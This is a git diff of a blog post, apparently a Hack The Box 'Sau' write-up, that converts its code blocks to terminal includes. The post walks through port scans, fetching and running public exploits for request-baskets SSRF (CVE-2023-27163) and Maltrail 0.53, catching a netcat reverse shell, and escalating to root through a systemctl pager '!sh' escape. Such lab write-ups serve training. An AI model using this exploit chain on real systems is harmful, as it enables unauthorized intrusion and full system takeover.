@@ -27,8 +27,7 @@ Insert clever pun here!
 
 Run nmap and get a list of the ports.
 
-{% raw %}
-```sh
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/htb/sau]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.11.224                   
 [sudo] password for kali: 
@@ -46,14 +45,14 @@ PORT      STATE    SERVICE VERSION
 55555/tcp open     http    Golang net/http server
 
 <snip>
-```
-{% endraw %}
+
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Run nmap against all the ports to find any non-standard services.
 
-{% raw %}
-```sh
+{% capture nmapfull %}
 ┌──(kali㉿kali)-[~/Documents/htb/sau]
 └─$ sudo nmap -sS -p- -oN nmapfull 10.10.11.224     
 [sudo] password for kali: 
@@ -68,8 +67,8 @@ PORT      STATE    SERVICE
 55555/tcp open     unknown
 
 Nmap done: 1 IP address (1 host up) scanned in 15.45 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmapfull %}
 
 <br />
 Check what is running on port 443.  Note the pfsense installation.
@@ -83,10 +82,7 @@ Check what is running on port 443.  Note the pfsense installation.
 <br />
 View the source code for the 55555 landing page.
 
-{% raw %}
-```html
-view-source:http://10.10.11.224:55555/web
-
+{% capture landingsource55555 %}
 <!DOCTYPE html>
 <html>
 <head lang="en">
@@ -111,8 +107,8 @@ view-source:http://10.10.11.224:55555/web
   </footer>
 </body>
 </html>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='browser' title='view-source:http://10.10.11.224:55555/web' content=landingsource55555 %}
 
 <br />
 Check the name of the program running and its version so we can research it.
@@ -145,8 +141,7 @@ Perform research on request-baskets, version 1.2.1.  Look for any vulnerabilitie
 <br />
 Download the exploit.
 
-{% raw %}
-```sh
+{% capture downloadexploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/sau]
 └─$ wget https://raw.githubusercontent.com/mathias-mrsn/request-baskets-v121-ssrf/refs/heads/master/exploit.py
 --2025-01-29 14:47:48--  https://raw.githubusercontent.com/mathias-mrsn/request-baskets-v121-ssrf/refs/heads/master/exploit.py
@@ -159,21 +154,20 @@ Saving to: ‘exploit.py’
 exploit.py                                                 100%[========================================================================================================================================>]   1.28K  --.-KB/s    in 0s      
 
 2025-01-29 14:47:48 (72.7 MB/s) - ‘exploit.py’ saved [1308/1308]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadexploit %}
 
 <br />
 Run the exploit.
 
-{% raw %}
-```sh
+{% capture runexploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/sau]
 └─$ python3 exploit.py http://10.10.11.224:55555 http://127.0.0.1
 Exploit for SSRF vulnerability on Request-Baskets (1.2.1) (CVE-2023-27163).
 Exploit successfully executed.
 Any request sent to http://10.10.11.224:55555/koicwd will now be forwarded to the service on http://127.0.0.1.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runexploit %}
 
 <br />
 The exploit is forwarding the localhost webserver on port 80 to the new basket that we just created.  Try navigating to this page in the web browser and view the internal website.
@@ -197,8 +191,7 @@ Lookup Mailtrail, v0.53, to see if any known vulnerabilities exist.
 <br />
 Download this new exploit so we can run it.
 
-{% raw %}
-```sh
+{% capture mailexploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/sau]
 └─$ wget https://raw.githubusercontent.com/spookier/Maltrail-v0.53-Exploit/refs/heads/main/exploit.py -O mailexploit.py
 --2025-01-29 15:01:18--  https://raw.githubusercontent.com/spookier/Maltrail-v0.53-Exploit/refs/heads/main/exploit.py
@@ -211,37 +204,34 @@ Saving to: ‘mailexploit.py’
 mailexploit.py                                             100%[========================================================================================================================================>]   2.15K  --.-KB/s    in 0s      
 
 2025-01-29 15:01:18 (45.5 MB/s) - ‘mailexploit.py’ saved [2200/2200]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=mailexploit %}
 
 <br />
 Start a listener.
 
-{% raw %}
-```sh
+{% capture startlistener %}
 ┌──(kali㉿kali)-[~/Documents/htb/sau]
 └─$ sudo nc -nlvp 443                            
 [sudo] password for kali: 
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=startlistener %}
 
 <br />
 Run the exploit.
 
-{% raw %}
-```sh
+{% capture runexploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/sau]
 └─$ python3 mailexploit.py 10.10.16.12 443 http://10.10.11.224:55555/koicwd
 Running exploit on http://10.10.11.224:55555/koicwd/login
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runexploit %}
 
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```sh
+{% capture catchshell %}
 ┌──(kali㉿kali)-[~/Documents/htb/sau]
 └─$ sudo nc -nlvp 443                            
 [sudo] password for kali: 
@@ -250,14 +240,13 @@ connect to [10.10.16.12] from (UNKNOWN) [10.10.11.224] 34026
 $ python3 -c 'import pty; pty.spawn("/bin/bash");'
 python3 -c 'import pty; pty.spawn("/bin/bash");'
 puma@sau:/opt/maltrail$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catchshell %}
 
 <br />
 Snag that user.txt flag.
 
-{% raw %}
-```sh
+{% capture userflag %}
 puma@sau:~$ cat user.txt
 cat user.txt
 <redacted>
@@ -277,14 +266,13 @@ ip a
        valid_lft 86399sec preferred_lft 14399sec
     inet6 fe80::250:56ff:feb9:d4ca/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=userflag %}
 
 <br />
 Run sudo -l to see what commands we can run as sudo.
 
-{% raw %}
-```sh
+{% capture sudol %}
 puma@sau:~$ sudo -l
 sudo -l
 Matching Defaults entries for puma on sau:
@@ -293,8 +281,8 @@ Matching Defaults entries for puma on sau:
 
 User puma may run the following commands on sau:
     (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sudol %}
 
 <br />
 Research systemctl to see all the different ways that we can abuse it to privesc.
@@ -309,22 +297,20 @@ Research systemctl to see all the different ways that we can abuse it to privesc
 <br />
 Run the sudo command and then drop into a shell.
 
-{% raw %}
-```sh
+{% capture getrootshell %}
 puma@sau:~$ sudo /usr/bin/systemctl status trail.service
 sudo /usr/bin/systemctl status trail.service
 WARNING: terminal is not fully functional
 -  (press RETURN)!sh
 !sshh!sh
 # 
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=getrootshell %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```sh
+{% capture rootflag %}
 # cat /root/root.txt
 cat /root/root.txt
 <redacted>
@@ -344,8 +330,8 @@ ip a
        valid_lft 86400sec preferred_lft 14400sec
     inet6 fe80::250:56ff:feb9:42ac/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=rootflag %}
 
 <br />
 Hopefully, you enjoyed the read.  Feel free to saunter back to read more write-ups.
